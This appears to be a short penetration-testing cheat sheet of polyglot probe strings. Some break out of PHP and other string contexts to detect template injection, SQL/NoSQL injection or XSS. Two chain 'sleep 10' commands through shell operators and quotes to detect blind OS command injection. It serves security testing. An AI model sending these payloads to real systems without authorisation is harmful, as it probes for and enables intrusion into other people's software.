# Errors based/behaviour inferer

## PHP String context for SSTi, evaluation, NoSQL, SQLi, XSS

``hello"."@(${{[%<%'**'><h1>asad2afdsd42sg</h1>`` => `Surrounding string:'` then output should be: `hello@(\${{[%<%"."> (concats ')` && `Surrounding string:"` then output should be: `hello'.'@(${{[%<%> concats(")`

## Other languages string context for SSTi, evaluation, NoSQL, SQLi, XSS

`hello"+"@(${{[%<%'**'><h1>asad2afdsd42sg</h1>` => `Sourrounding string:'` then output should be: `Generic Error Message (Fails to concat)` && `Surrounding string: "` then output should be `hello@(${{[%<%'**'> (Concats)`

`hello"%2b"%40(${{[%25<%25'**'><h1>asad2afdsd42sg</h1>`

## Error based inferer for OSCMDi, Path Traversal in Unix

``$(sleep+10)+||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10+`sleep+10`";$(sleep+10)+`sleep+10`||+sleep+10+|+sleep+10;+sleep+10+%26%26+sleep+10"';sleep+10+%26%26sleep+10+||+sleep+10+|+sleep+10+`sleep+10`'``

``$(sleep 10) || sleep 10 | sleep 10; sleep 10 && sleep 10 `sleep 10`";$(sleep 10) `sleep 10`|| sleep 10 | sleep 10; sleep 10 && sleep 10"';sleep 10 && sleep 10 || sleep 10 | sleep 10 `sleep 10`'``

Works in raw format, between `'` or `"`.
